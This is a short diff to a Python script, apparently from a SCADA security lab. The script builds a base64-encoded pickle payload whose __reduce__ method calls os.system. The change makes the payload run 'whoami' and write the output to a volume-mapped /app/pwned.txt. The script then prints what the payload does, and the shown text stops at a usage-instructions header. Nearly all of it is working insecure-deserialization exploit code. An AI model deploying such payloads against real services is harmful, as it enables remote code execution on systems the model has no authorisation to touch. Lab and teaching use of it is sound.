@@ -39,14 +39,16 @@ class MaliciousPayload:
     def __reduce__(self):
         import os
         # This will execute 'whoami' command when unpickled
-        return (os.system, ('echo "MALICIOUS CODE EXECUTED!" > /tmp/pwned.txt',))
+        # Write to /app which is volume-mapped to host
+        return (os.system, ('whoami > /app/pwned.txt && echo "RCE SUCCESS: Command executed at $(date)" >> /app/pwned.txt',))
 
 malicious_pickle = pickle.dumps(MaliciousPayload())
 malicious_b64 = base64.b64encode(malicious_pickle).decode('utf-8')
 print(f"Base64 Payload:\n{malicious_b64}")
 print("\nIf this payload is deserialized, it will:")
-print("- Execute system command")
-print("- Create /tmp/pwned.txt file")
+print("- Execute system command (whoami)")
+print("- Create pwned.txt in current directory (volume-mapped)")
+print("- You can see it at: scada_security_lab/pwned.txt")
 
 print("\n" + "=" * 60)
 print("USAGE INSTRUCTIONS:")
